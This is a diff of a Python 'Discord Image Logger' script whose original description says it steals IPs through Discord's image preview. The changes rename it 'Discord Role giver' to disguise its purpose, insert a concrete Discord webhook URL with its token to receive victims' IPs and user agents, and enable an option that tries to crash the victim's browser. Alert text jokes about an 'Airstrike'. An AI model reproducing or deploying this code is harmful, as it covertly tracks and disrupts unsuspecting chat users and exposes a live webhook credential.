@@ -5,24 +5,24 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord Role giver"
+__description__ = "A simple application which allows you to give roles and more by abusing you."
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334933955505553519/95-1AF72XFNTbfmMpXRvyMgVIuTcXweP5dqcelbXDrTubd414vGDBPeQ_TnNO5Y_j494",
+    "image": "https://www.chromethemer.com/wallpapers/chromebook-wallpapers/images/960/king-von-chromebook-wallpaper.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "transgy", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "=" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -80,9 +80,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "touchmaster - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"An error occurred while trying!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Loading!** link was sent in a chat!\nYou may receive an Airstrike soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
